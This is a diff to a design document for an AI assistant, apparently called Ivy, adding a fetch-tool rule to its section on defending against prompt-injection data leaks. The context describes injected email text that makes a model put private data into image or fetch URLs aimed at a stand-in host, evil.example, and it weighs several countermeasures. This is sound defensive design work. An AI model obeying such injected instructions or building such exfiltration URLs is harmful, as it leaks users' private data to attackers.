@@ -354,6 +354,7 @@ A plugin is a folder with an `index.ts` that default-exports an `IvyPlugin`. The
 - **What the window loads can leak too, without a tool.** Text hidden in an email can tell the model to put what it knows into an image's URL (`![](https://evil.example/x.png?d=…)`); a page that loads a reply's images sends it with no one seeing, past every permission prompt. Reported against ChatGPT, Claude.ai and Copilot. So a reply's images wait for a click (§5.7). It is not a full defense: a click made without reading the site still sends the URL, and so does opening a link, which carries the same risk. What would do more, and why not now:
   - **Only URLs already in the conversation load** (ChatGPT's way): a URL the model builds can't be among them, as the data wasn't known when they were written. It needs every tool marked for whether its results are outside content: what Ivy wrote and read back (memory, a file) must not count, or a URL saved by a tool and read back passes. And it still leaks a little: an injection can list a URL per letter and have the model pick, so a cap on how many load is needed too.
   - **A model judging each URL** would read the same injected text as the one it checks, and is right only most of the time; the boundary has to be a rule, not a judgment.
+- **`fetch` (M4) is the same channel, with no click at all**: a request to `evil.example/?d=…` carries the data off. So it fetches unasked only a URL the conversation already had (the user's messages, search results, a page fetched before), which can't hold what the model read since; one the model built is asked about, the whole URL shown, with *always* for its site. Its results are outside content (§8.1).
 
 ### 6.4 Reusing other ecosystems
 
@@ -405,7 +406,7 @@ The data root is `$IVY_HOME`, default `~/.ivy`, in development too, so the termi
 | `coding-agent` | M3 | Optional delegate for coding tasks to any coding CLI that speaks the Agent Client Protocol (Claude Code and Codex through adapters, Gemini CLI natively), run as a subagent. The agent's own permission requests go through Ivy's gate. Optional: Ivy's `fs` and `shell` stay the baseline (principle 7) | `run` |
 | `mcp` bridge | M3 | Wraps configured MCP servers as plugins | (from servers) |
 | `gmail` / `calendar` | M4 | Triage, summarize, draft replies, today's agenda — via MCP servers or Google APIs | `search`, `read_thread`, `draft`, `agenda` |
-| `web` | M4 | Web search & fetch (Anthropic server tools on Anthropic's API; otherwise a client-side tool) | `search`, `fetch` |
+| `web` | M4 | Web search & fetch (Anthropic server tools on Anthropic's API; otherwise a client-side tool); a URL is fetched unasked only if the conversation already had it (§6.3) | `search`, `fetch` |
 | `digest` | M5 | Scheduled brief from RSS / GitHub / email / calendar | job `morning-brief` |
 
 ### 8.1 Memory plugin
